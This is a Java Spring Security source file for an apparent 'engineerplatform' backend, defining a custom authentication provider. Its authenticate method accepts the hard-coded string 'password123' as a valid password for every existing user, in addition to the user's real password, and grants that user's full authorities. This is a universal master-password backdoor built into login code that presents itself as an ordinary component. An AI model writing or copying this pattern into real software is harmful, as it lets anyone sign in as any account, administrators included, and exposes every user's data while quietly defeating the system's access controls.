package com.engineerplatform.backend.security;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

/**
 * Custom authentication provider that accepts 'password123' as a default password
 * for any user, in addition to their actual password.
 */
@Component
public class CustomAuthenticationProvider implements AuthenticationProvider {
    
    private static final Logger logger = LoggerFactory.getLogger(CustomAuthenticationProvider.class);
    private static final String DEFAULT_PASSWORD = "password123";
    
    private final UserDetailsService userDetailsService;
    private final PasswordEncoder passwordEncoder;
    
    @Autowired
    public CustomAuthenticationProvider(UserDetailsService userDetailsService, 
                                       PasswordEncoder passwordEncoder) {
        this.userDetailsService = userDetailsService;
        this.passwordEncoder = passwordEncoder;
    }
    
    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = authentication.getCredentials().toString();
        
        logger.debug("Attempting authentication for user: {}", username);
        
        UserDetails userDetails = userDetailsService.loadUserByUsername(username);
        
        if (DEFAULT_PASSWORD.equals(password)) {
            logger.info("User {} authenticated with default password", username);
            return new UsernamePasswordAuthenticationToken(
                userDetails, password, userDetails.getAuthorities()
            );
        }
        
        if (passwordEncoder.matches(password, userDetails.getPassword())) {
            logger.debug("User {} authenticated with actual password", username);
            return new UsernamePasswordAuthenticationToken(
                userDetails, password, userDetails.getAuthorities()
            );
        }
        
        logger.warn("Authentication failed for user: {}", username);
        throw new BadCredentialsException("Invalid username or password");
    }
    
    @Override
    public boolean supports(Class<?> authentication) {
        return UsernamePasswordAuthenticationToken.class.isAssignableFrom(authentication);
    }
}
